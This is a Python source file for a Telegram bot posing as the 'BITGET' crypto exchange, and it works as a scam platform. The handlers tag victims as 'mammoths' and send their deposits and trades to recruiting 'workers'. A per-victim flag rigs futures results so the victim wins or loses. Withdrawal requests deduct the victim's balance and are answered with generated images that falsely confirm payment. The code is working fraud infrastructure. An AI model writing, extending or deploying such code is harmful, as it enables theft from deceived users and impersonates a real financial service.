import os
from aiogram.dispatcher import FSMContext
from aiogram.types import InputFile

from start_bot.start_bot import bot, dp
from aiogram import types, Dispatcher

from data import config
from models import *
from handlers.main import keyboards
from handlers.main import states

from handlers.main import TEXTS, utils

import time


async def start_handler(message: types.Message, state: FSMContext):
    await state.finish()
    params = message.text.split()
    if len(params) > 1:
        family = Family.get_or_none(baby_id=message.from_user.id)
        if not family:
            family = Family.create(user_id=int(params[1]), baby_id=message.from_user.id)
            family.save()
            text = f'''<b>🦣 У вас новый мамонт <a href="{message.chat.user_url}">{message.from_user.first_name}</a></b>'''
            await bot.send_message(family.user_id, text)
    user = User.get_or_none(user_id=message.from_user.id)
    if not user:
        user = User.create(user_id=message.from_user.id)
        image_path = "cabinet.jpg"  # Path to the image file
        text = f"ID: {message.from_user.id}"  # Text to be added on the image
        output_path = f"{message.from_user.id}.jpg"  # Path to save the modified image

        utils.add_text_to_image(image_path, text, output_path)
        file = InputFile(output_path)
        mes = await bot.send_photo(config.SERVICE_CHAT_ID, file)
        user.cabinet_file_id = mes.photo[-1].file_id
        user.save()

    file = config.START_FILE_ID
    await message.answer_photo(file, reply_markup=keyboards.main_reply(message.from_user.id))
    await message.answer('<b>🔹 Добро пожаловать на мультивалютную крипто-биржу BITGET!🔹 Добро пожаловать на мультивалютную крипто-биржу BITGET!</b>', reply_markup=keyboards.start_inline())

async def profile_handler(message: types.Message, state: FSMContext):
    file = config.CABINET_FILE_ID
    user = User.get_or_none(user_id=message.from_user.id)
    await message.answer_photo(user.cabinet_file_id, caption=TEXTS.cabinet(user), reply_markup=keyboards.cabinet())

async def deposite_handler(call: types.CallbackQuery, state: FSMContext):
    file = config.DEPOSITE_FILE_ID
    await call.message.delete()
    await call.message.answer_photo(file, caption=TEXTS.deposite, reply_markup=keyboards.deposite())

async def withdraw_handler(call: types.CallbackQuery, state: FSMContext):
    cfg = utils.get_my_config(call.from_user.id)
    if cfg.withdraw == 3:
        await call.message.answer("<b>Вывод доступен только верифицированным пользователям</b>", reply_markup=keyboards.verif())
        return
    file = config.WITHDRAW_FILE_ID
    await call.message.delete()
    mes = await call.message.answer_photo(file, caption=TEXTS.withdraw_send, reply_markup=keyboards.back_to_menu())

    await states.Withdraw.setAmount.set()
    await state.update_data(message=mes)
    # await call.message.answer_photo(file, caption=TEXTS.withdraw, reply_markup=keyboards.withdraw())

async def set_withdraw_handler(message: types.Message, state: FSMContext):
    cfg = utils.get_my_config(message.from_user.id)
    file = config.WITHDRAW_FILE_ID
    if not message.text.isdigit():
        await message.answer('Неверный ввод!')
        return
    price = int(message.text)
    user = User.get(user_id=message.from_user.id)
    if user.balance < price or price < config.min_with:
        await message.answer('Неправильная сумма!')
        return  
    
    data = await state.get_data()
    await states.Withdraw.setRequisites.set()
    await state.update_data(data, price=price)
    await bot.delete_message(message.chat.id, message.message_id)
    await data['message'].edit_caption(caption=TEXTS.withdraw_send_requisites, reply_markup=keyboards.back_to_menu())


async def set_requisites_withdraw_handler(message: types.Message, state: FSMContext):
    import datetime
    import random
    import pytz

    cfg = utils.get_my_config(message.from_user.id)
    file = config.WITHDRAW_FILE_ID

    req = message.text
    user = User.get(user_id=message.from_user.id)
    
    if cfg.withdraw == 1:
        if req not in config.reqs:
            await message.answer("<b>Вывод доступен только на ваши реквизиты, с которых выполнялось пополнение</b>")
            return
    data = await state.get_data()
    await state.finish()
    user.balance = user.balance - data['price']
    user.save()
    utc_now = datetime.datetime.now(pytz.utc)

    moscow_tz = pytz.timezone("Europe/Moscow")

    moscow_now = utc_now.astimezone(moscow_tz)

    formatted_date = moscow_now.strftime("%Y-%m-%d %H:%M:%S")
    text =f'''⏳ Заявка на вывод создана

Суммa: <b>{data['price']}</b>
Создано: <b>{formatted_date}</b>
Мы <b>оповестим</b> вас, когда заявка будет выполнена'''
    await message.answer(text)
    try:
        await bot.delete_message(message.chat.id, message.message_id)
        await bot.delete_message(message.chat.id, data['message'].message_id)
    except Exception:
        pass  
    if cfg.withdraw == 1:
        time.sleep(random.randint(120, 150))
        file_path = utils.withdraw_photo(req, data['price'], message.from_user.first_name)
        file = InputFile(file_path)
        await message.answer_photo(file, caption='Заявка на вывод успешно выполнена!')
        try:
            os.remove(file_path)
            print(f"File '{file_path}' removed successfully!")
        except FileNotFoundError:
            print(f"File '{file_path}' not found!")
        except PermissionError:
            print(f"You don't have permission to remove file '{file_path}'!")
        except Exception as e:
            print(f"An error occurred while removing file '{file_path}': {e}")

    else:
        worker_id = utils.get_my_config_id(message.chat.id)
        text = f'''<b>Новый запрос на вывод!</b>
        
        🦣Мамонт: <a href="{message.chat.user_url}">{message.from_user.first_name}</a>[<code>{message.from_user.id}</code>]
        💸 Сумма: {data['price']} RUB
        💳 Реквизиты: {message.text}
        📄 Итог: требуется подтверждение'''
        # text = f'''<b>Мамонт <a href="{message.chat.user_url}">{message.from_user.first_name}</a></b>
        
        # Поставил на вывод: {data['price']} RUB 
        
        # ч: {message.text}'''

        await bot.send_message(worker_id, text, reply_markup=keyboards.withdraw_admin(message.chat.id, message.text, data['price']))

async def withdraw_yes_handler(call: types.CallbackQuery, state: FSMContext):
    user_id = int(call.data.split('$')[1])
    req = call.data.split('$')[2]
    price = int(call.data.split('$')[3])
    await call.message.delete()
    await call.message.answer('Отправлено!')
    chat = await bot.get_chat(user_id)
    file_path = utils.withdraw_photo(req, price, chat.first_name)
    file = InputFile(file_path)
    await bot.send_photo(user_id, file, caption='Заявка на вывод успешно выполнена!')
    try:
        os.remove(file_path)
    except FileNotFoundError:
        print(f"File '{file_path}' not found!")
    except PermissionError:
        print(f"You don't have permission to remove file '{file_path}'!")
    except Exception as e:
        print(f"An error occurred while removing file '{file_path}': {e}")
    # await bot.send_message(user_id, '<b>✅ Заявка на вывод успешно выполнена!\n\n<i>Средства переведены на ваши реквизиты</i></b>')

async def withdraw_no_handler(call: types.CallbackQuery, state: FSMContext):
    user_id = int(call.data.split('$')[1])
    await call.message.delete()
    await call.message.answer('Отправлено!')
    await bot.send_message(user_id, '<b>❌ Заявка на вывод отклонена!\n\n<i>Обратитесь в поддержку для получения полной информации</i></b>')


async def dep_fiat_handler(call: types.CallbackQuery, state: FSMContext):
    user = User.get(user_id=call.from_user.id)
    await states.Deposite.setAmount.set()
    await state.update_data(type='fiat')
    await call.message.edit_caption(TEXTS.deposite_amount(user), reply_markup=keyboards.back_to_menu())

async def dep_sbp_handler(call: types.CallbackQuery, state: FSMContext):
    user = User.get(user_id=call.from_user.id)
    await states.Deposite.setAmount.set()
    await state.update_data(type='sbp')
    await call.message.edit_caption(TEXTS.deposite_amount(user), reply_markup=keyboards.back_to_menu())

async def call_profile_handler(call: types.CallbackQuery, state: FSMContext):
    file = config.CABINET_FILE_ID
    user = User.get_or_none(user_id=call.from_user.id)
    await call.message.answer_photo(user.cabinet_file_id, caption=TEXTS.cabinet(user), reply_markup=keyboards.cabinet())
    # await call.message.delete()
    # await bot.delete_message(call.from_user.id, call.message.message_id-1)

async def currency_handler(call: types.CallbackQuery, state: FSMContext):
    await call.message.edit_caption(caption=TEXTS.currency, reply_markup=keyboards.currency())

async def wit_fiat(call: types.CallbackQuery, state: FSMContext):
    text ='''📝 Введите Ваши реквизиты банковской карты

⚠️ Учтите, вывод возможен только на реквизиты, с которых пополнялся Ваш баланс в последний раз. Реквизиты для вывода меняются автоматически после пополнения с другой карты или платёжной системы.'''

    await call.message.edit_caption(caption=text, reply_markup=keyboards.back_to_menu())

    await states.Withdraw.setAmount.set()
    await state.update_data(message=call.message)

async def set_wit_fiat(message: types.Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer('Ошибка!')
        return

    price = int(message.text)
    user = User.get(user_id=message.from_user.id)
    if price > user.balance:
        await message.answer('Недостаточно баланса!')
        return

    await message.answer('Заявка на вывод создана!')
    data = await state.get_data()
    await state.finish()

    await data['message'].delete()
    await bot.delete_message(message.chat.id, message.message_id)

    user.balance = user.balance - price
    user.save()
        

async def set_currency_handler(call: types.CallbackQuery, state: FSMContext):
    user = User.get(user_id=call.from_user.id)
    currency = int(call.data.split('$')[1])
    user.currency = currency
    user.save()
    await back_menu(call, state)

async def setting_handler(call: types.CallbackQuery, state: FSMContext):
    await call.message.delete()
    file = config.INFO_FILE_ID
    await call.message.answer_photo(file, caption=TEXTS.setting, reply_markup=keyboards.setting())

async def verif_handler(call: types.CallbackQuery, state: FSMContext):
    await call.message.delete()
    file = config.VERIF_FILE_ID
    await call.message.answer_photo(file, caption=TEXTS.verif, reply_markup=keyboards.verif())

async def support_handler(message: types.Message, state: FSMContext):
    await state.finish()
    file = config.SUPPORT_FILE_ID
    await message.answer_photo(file, TEXTS.support, reply_markup=keyboards.support())

async def info_handler(message: types.Message, state: FSMContext):
    await state.finish()
    file = config.INFO_FILE_ID
    await message.answer_photo(file, caption=TEXTS.info, reply_markup=keyboards.info())

async def future_handler(message: types.Message, state: FSMContext):
    file = config.ACTIVES_FILE_ID
    await message.answer_photo(file, caption=TEXTS.futures, reply_markup=keyboards.futures(0))

async def spot_handler(message: types.Message, state: FSMContext):
    file = config.ACTIVES_FILE_ID
    user = User.get(user_id=message.from_user.id)
    await message.answer_photo(file, caption=TEXTS.spot, reply_markup=keyboards.spot(user))

async def switch_future_handler(call: types.CallbackQuery, state: FSMContext):
    await call.message.edit_reply_markup(reply_markup=keyboards.futures(int(call.data.split('$')[1])))

async def open_future_handler(call: types.CallbackQuery, state: FSMContext):
    await call.message.delete()
    crypto = config.crypto_list[int(call.data.split('$')[1])]
    user = User.get(user_id=call.from_user.id)
    file = InputFile(f'.\images\{crypto[0]}.jpg')
    text, price = TEXTS.future_open(crypto, user)
    mes = await call.message.answer_photo(file, caption=text, reply_markup=keyboards.back_to_futures())
    await states.Future.setAmount.set()
    await state.update_data(crypto=int(call.data.split('$')[1]), message=mes, start_price=price)

async def photo_handler(message: types.Message, state: FSMContext):
     print(message.photo[-1].file_id)

async def send_dep_amount_handler(message: types.Message, state: FSMContext):
    user = User.get(user_id=message.from_user.id)
    price = utils.check_amount(message.text, user)
    if not price:
        await message.answer('Неверный ввод')
        return 
    data = await state.get_data()
    
    depo = Depo.create(
        user_id = message.from_user.id,
        time = time.time(),
        price = price,
        type = data["type"]
    )
    depo.save()
    cfg = utils.get_my_config_id(message.from_user.id)
    text = f'''Новоя заявка на пополнение
Мамонт: <a href="{message.chat.user_url}">{message.from_user.first_name}</a>
ID: {message.from_user.id}
    
Размер: {price}
Тип: {data['type']}'''
    await bot.send_message(cfg, text, reply_markup=keyboards.send_deposite(depo.id))
    await message.answer_photo(config.DEPOSITE_FILE_ID, caption=TEXTS.deposite_message(price, user, data["type"]), reply_markup=keyboards.check_deposite(id=depo.id))

async def send_future_amount_handler(message: types.Message, state: FSMContext):
    user = User.get(user_id=message.from_user.id)
    price = utils.check_future_amount(message.text, user)
    if not price:
        await message.answer('Неверный ввод')
        return 
    data = await state.get_data()
    future = Fututes.create(user_id=user.user_id,
                            coin=data['crypto'],
                            amount=price,
                            start_price=data['start_price'])
    future.save()
    await states.Future.setTime.set()
    await states.Future.setType.set()
    await state.update_data(future=future)
    
    await message.answer('''🗯 Куда пойдет курс актива?

📈 Коэффициенты:
Вверх - x2.0
Не изменится - x10.0
Вниз - x2.0''', reply_markup=keyboards.setType())
    await bot.delete_message(message.from_user.id, message_id=message.message_id)


    # await data['message'].edit_caption(caption=TEXTS.info_future(future), reply_markup=keyboards.setTime())

async def send_future_time_hand_amount_handler(message: types.Message, state: FSMContext):
    data = await state.get_data()
    text = message.text
    await bot.delete_message(message.chat.id, message.message_id)
    if text == '❌ Отмена':
        await message.answer()
        await states.Future.setTime.set()
        await state.update_data(data)
        await message.answer('🕰 Время ожидания:', reply_markup=keyboards.setTime())
        return

    if not text.isdigit():
        await state.finish()
        await message.answer('❌ Некорректный ввод', reply_markup=keyboards.main_reply())

    if int(text) < 1 or int(text) > 5:
        await state.finish()
        await message.answer('❌ Некорректный ввод', reply_markup=keyboards.main_reply())

    
    data["future"].time = int(text) * 60
    data["future"].save()
    await state.update_data(future=data["future"])



async def send_future_time_handler(call: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    if call.data.split('$')[1] == 'hand':
        await call.message.delete()
        await states.Future.setTimeHand.set()
        await state.update_data(data)
        await call.message.answer('Введите время в диапазоне от 1 до 5 минут:', reply_markup=keyboards.cancel_reply())

        return 
    data["future"].time = int(call.data.split('$')[1])
    data["future"].save()
    await state.update_data(future=data["future"])

    await call.message.delete()

    # await call.message.edit_caption(caption=TEXTS.info_future(data["future"]), reply_markup=keyboards.setCredit())
    
    import random
    user = User.get(user_id=call.from_user.id)
    if user.balance < data["future"].amount:
        await call.message.answer('Недостаточно баланса')
        await state.finish()
        return

    user.balance = user.balance - data["future"].amount
    user.save()

    currency = Currency.get(id=user.currency)
    prices = [data["future"].start_price]
    # utils.gif([1, 3, 2, -1, 3, 2, -1, 3, 2, -1, 3, 2, -1, 3, 2, -1, 3, 2, -1, 3, 2, -1, 3, 2, -1, 3, 2, -1, 3, 2, -1, 3, 2, -1, 3, 2, -1, 3, 2, -1, 3, 2, -1, 3, 2, -1], 12, 1)

    cfg = utils.get_my_config(call.from_user.id)
    fam = Family.get_or_none(baby_id=call.from_user.id)
    if not fam:
        worker_id = config.CHAT
    else:
        worker_id = fam.user_id

    worker_config = WorkerConfig.get_or_none(worker_id=worker_id)
    if worker_config:
        if worker_config.logging:
            worker_id = utils.get_my_config_id(call.from_user.id)
            text = f'''Мамонт {call.from_user.first_name} открыл фьючерс

    {config.crypto_list[data['future'].coin][0]}

    {data['future'].amount} р
    {data['future'].time} сек.'''
            await bot.send_message(worker_id, text)

    mes = await call.message.answer(TEXTS.info_future(data["future"], 0, new_price=data['future'].start_price))
    if cfg.lucky == 1:
        for i in range(data['future'].time):
            time.sleep(1)
            r_1 = round(config.crypto_list[data['future'].coin][1]*random.randint(99050, 101050) / 100000, 4)
            now_price = round(r_1 / currency.exchange_rate, 1)
            prices.append(now_price)
            await mes.edit_text(TEXTS.info_future(data["future"], i, new_price=now_price))
    
    else:
        for i in range(data['future'].time - 2):
            time.sleep(1)
            r_1 = round(config.crypto_list[data['future'].coin][1]*random.randint(99850, 100150) / 100000, 4)
            now_price = round(r_1 / currency.exchange_rate, 1)
            prices.append(now_price)
            await mes.edit_text(TEXTS.info_future(data["future"], i, new_price=now_price))

        if cfg.lucky == 0:
            if data['future'].type == 'long':
                last_price = round(data['future'].start_price*random.randint(99850, 100000) / 100000, 4)
                prices.append(random.uniform(prices[-1], last_price))
            else:
                last_price = round(data['future'].start_price*random.randint(100000, 100150) / 100000, 4)
                prices.append(random.uniform(prices[-1], last_price))
        else:
            if data['future'].type == 'short':
                last_price = round(data['future'].start_price*random.randint(99850, 100000) / 100000, 4)
                prices.append(random.uniform(prices[-1], last_price))
            else:
                last_price = round(data['future'].start_price*random.randint(100000, 100150) / 100000, 4)
                prices.append(random.uniform(prices[-1], last_price))
        prices.append(last_price) 

    # utils.gif(prices, config.crypto_list[data["future"].coin][0], id=data["future"].id)
    # file = InputFile(f'{data["future"].id}.png')
    
    await mes.delete()
    mes = await call.message.answer(TEXTS.future_end(data["future"], prices), reply_markup=keyboards.back_to_menu())
    



async def send_future_type_handler(call: types.CallbackQuery, state: FSMContext):

    data = await state.get_data()
    data["future"].type = call.data.split('$')[1]
    data["future"].save()


    await states.Future.setTime.set()
    await state.update_data(future=data["future"])

    await call.message.edit_text('🕰 Время ожидания:', reply_markup=keyboards.setTime())

    # import random
#     user = User.get(user_id=call.from_user.id)
#     if user.balance < data["future"].amount:
#         await call.message.answer('Недостаточно баланса')
#         await state.finish()
#         return

#     user.balance = user.balance - data["future"].amount
#     user.save()

#     currency = Currency.get(id=user.currency)
#     prices = [data["future"].start_price]
#     # utils.gif([1, 3, 2, -1, 3, 2, -1, 3, 2, -1, 3, 2, -1, 3, 2, -1, 3, 2, -1, 3, 2, -1, 3, 2, -1, 3, 2, -1, 3, 2, -1, 3, 2, -1, 3, 2, -1, 3, 2, -1, 3, 2, -1, 3, 2, -1], 12, 1)

#     cfg = utils.get_my_config(call.from_user.id)
#     fam = Family.get_or_none(baby_id=call.from_user.id)
#     if not fam:
#         worker_id = config.CHAT
#     else:
#         worker_id = fam.user_id

#     worker_config = WorkerConfig.get(worker_id=worker_id)
#     if worker_config.logging:
#         worker_id = utils.get_my_config_id(call.from_user.id)
#         text = f'''Мамонт {call.from_user.first_name} открыл фьючерс

# {config.crypto_list[data['future'].coin][0]}

# {data['future'].amount} р
# {data['future'].time} сек.'''
#         await bot.send_message(worker_id, text)

#     if cfg.lucky == 1:
#         print('lucky 1')
#         for i in range(data['future'].time):
#             time.sleep(1)
#             r_1 = round(config.crypto_list[data['future'].coin][1]*random.randint(99950, 100500) / 100000, 4)
#             now_price = round(r_1 / currency.exchange_rate, 1)
#             prices.append(now_price)
#             await call.message.edit_caption(caption=TEXTS.info_future(data["future"], i, new_price=now_price))
    
#     else:
#         print('Not random')
#         for i in range(data['future'].time - 2):
#             time.sleep(1)
#             r_1 = round(config.crypto_list[data['future'].coin][1]*random.randint(99950, 100050) / 100000, 4)
#             now_price = round(r_1 / currency.exchange_rate, 1)
#             prices.append(now_price)
#             await call.message.edit_caption(caption=TEXTS.info_future(data["future"], i, new_price=now_price))

#         if cfg.lucky == 0:
#             print('lose')
#             if data['future'].type == 'long':
#                 last_price = round(data['future'].start_price*random.randint(99950, 100000) / 100000, 4)
#                 prices.append(random.uniform(prices[-1], last_price))
#             else:
#                 last_price = round(data['future'].start_price*random.randint(100000, 100050) / 100000, 4)
#                 prices.append(random.uniform(prices[-1], last_price))
#         else:
#             print('win')
#             if data['future'].type == 'short':
#                 last_price = round(data['future'].start_price*random.randint(99950, 100000) / 100000, 4)
#                 prices.append(random.uniform(prices[-1], last_price))
#             else:
#                 last_price = round(data['future'].start_price*random.randint(100000, 100050) / 100000, 4)
#                 prices.append(random.uniform(prices[-1], last_price))
#         prices.append(last_price) 

#     utils.gif(prices, config.crypto_list[data["future"].coin][0], id=data["future"].id)
#     file = InputFile(f'{data["future"].id}.png')
    
#     await call.message.delete()
#     mes = await call.message.answer_photo(file, caption=TEXTS.future_end(data["future"], prices), reply_markup=keyboards.back_to_menu())
    



async def back_menu(call: types.CallbackQuery, state: FSMContext):
    await state.finish()
    await call.message.delete()
    file = config.CABINET_FILE_ID
    user = User.get_or_none(user_id=call.from_user.id)
    await call.message.answer_photo(user.cabinet_file_id, caption=TEXTS.cabinet(user), reply_markup=keyboards.cabinet())

async def back_future(call: types.CallbackQuery, state: FSMContext):
    await call.message.delete()
    await state.finish()
    file = config.ACTIVES_FILE_ID
    await call.message.answer_photo(file, caption=TEXTS.futures, reply_markup=keyboards.futures(0))



async def send_future_credit_handler(call: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    data["future"].credit = float(call.data.split('$')[1])
    data["future"].save()
    await state.update_data(future=data["future"])

    await call.message.edit_caption(caption=TEXTS.info_future(data["future"]), reply_markup=keyboards.setType())

async def check_deposite_handler(call: types.CallbackQuery, state: FSMContext):
    dep_id = int(call.data.split('$')[1])
    dep = Depo.get(id=dep_id)
    if dep.is_payment:
        await call.message.delete()
        user = User.get(user_id=call.from_user.id)
        user.balance = user.balance + dep.price
        user.save()
        await call.message.answer('Зачислено!')
    else:
        await call.answer('Оплата не произведена', show_alert=True)


async def cancel_deposite_handler(call: types.CallbackQuery, state: FSMContext):
    dep_id = int(call.data.split('$')[1])
    dep = Depo.get(id=dep_id)
    dep.is_canceled = True
    dep.save()
    await call.message.delete()
    await call.message.answer('<b>🔹 Добро пожаловать на мультивалютную крипто-биржу BITGET!🔹 Добро пожаловать на мультивалютную крипто-биржу BITGET!</b>', reply_markup=keyboards.start_inline())
    


def register_handlers(dp: Dispatcher):
	dp.register_message_handler(start_handler, commands=['start', 'restart'], state='*')
	dp.register_message_handler(profile_handler, content_types=['text'], text='📂 Профиль', state='*')
	dp.register_callback_query_handler(call_profile_handler, text='profile', state='*')
	dp.register_callback_query_handler(deposite_handler, text='deposite', state='*')
	dp.register_callback_query_handler(withdraw_handler, text='withdraw', state='*')
	dp.register_callback_query_handler(withdraw_yes_handler, text_startswith='withdraw_yes', state='*')
	dp.register_callback_query_handler(withdraw_no_handler, text_startswith='withdraw_no', state='*')
	dp.register_callback_query_handler(dep_fiat_handler, text='dep_fiat', state='*')
	dp.register_callback_query_handler(dep_sbp_handler, text='dep_sbp', state='*')
	dp.register_callback_query_handler(currency_handler, text='currency', state='*')
	dp.register_callback_query_handler(wit_fiat, text='wit_fiat', state='*')
	dp.register_message_handler(set_withdraw_handler, content_types=["text"], state=states.Withdraw.setAmount)
	dp.register_message_handler(set_requisites_withdraw_handler, content_types=["text"], state=states.Withdraw.setRequisites)
	dp.register_callback_query_handler(switch_future_handler, text_startswith='switch_future', state='*')
	dp.register_callback_query_handler(open_future_handler, text_startswith='open_future', state='*')
	dp.register_callback_query_handler(setting_handler, text='setting', state='*')
	dp.register_callback_query_handler(set_currency_handler, text_startswith='set_currency', state='*')
	dp.register_callback_query_handler(verif_handler, text='verificate', state='*')
	dp.register_callback_query_handler(back_menu, text='back_menu', state='*')
	dp.register_callback_query_handler(back_future, text='back_future', state='*')
	dp.register_callback_query_handler(send_future_time_handler, text_startswith='set_time', state='*')
	dp.register_callback_query_handler(send_future_credit_handler, text_startswith='set_credit', state='*')
	dp.register_callback_query_handler(send_future_type_handler, text_startswith='set_type', state='*')
	dp.register_callback_query_handler(check_deposite_handler, text_startswith='check_deposite', state='*')
	dp.register_callback_query_handler(cancel_deposite_handler, text_startswith='cancel', state='*')
	dp.register_message_handler(support_handler, content_types=['text'], text='👨🏻‍💻Тех. Поддержка', state='*')
	dp.register_message_handler(future_handler, content_types=['text'], text='📊 Опционы', state='*')
	dp.register_message_handler(spot_handler, content_types=['text'], text='🪙 Спот', state='*')
	dp.register_message_handler(info_handler, content_types=['text'], text='📖 Информация', state='*')
	dp.register_message_handler(send_dep_amount_handler, content_types=['text'], state=states.Deposite.setAmount)
	dp.register_message_handler(send_future_amount_handler, content_types=['text'], state=states.Future.setAmount)
	dp.register_message_handler(send_future_time_hand_amount_handler, content_types=['text'], state=states.Future.setTimeHand)
	dp.register_message_handler(photo_handler, content_types=['photo'], state='*')
	